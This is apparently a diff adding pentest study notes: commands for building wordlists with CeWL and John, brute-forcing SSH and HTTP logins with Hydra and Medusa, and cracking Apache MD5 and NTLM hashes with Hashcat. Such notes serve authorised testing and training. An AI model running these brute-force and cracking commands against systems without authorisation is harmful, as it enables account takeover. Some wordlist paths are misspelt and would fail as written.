@@ -1,0 +1,36 @@
+
+Cewl
+cewl http://<targetip>/ -m 6 -w cewl.txt
+wc -l cewl.txt
+john --wordlist=cewl.txt --rules --stdout > mutated.txt
+wc mutated.txt
+
+
+-----------------------------------
+
+Hydra
+
+hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
+hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
+
+
+Medusa
+medusa -h <targetip> -u admin -P /usr/share/wordlısts/rockyou.txt -M http -m DIR:/test -T 10
+
+-----------------------------------
+
+Hashcat
+
+# learn the hash type from hashcat.net example hashes page and pass as its m value
+# or you can learn with the following command
+hashcat -h | grep -i lm
+hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
+
+-----------------------------------
+
+LM/NTLM
+hashcat -h | grep -i lm 
+hashcat -m 3000  hashes --rules --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+
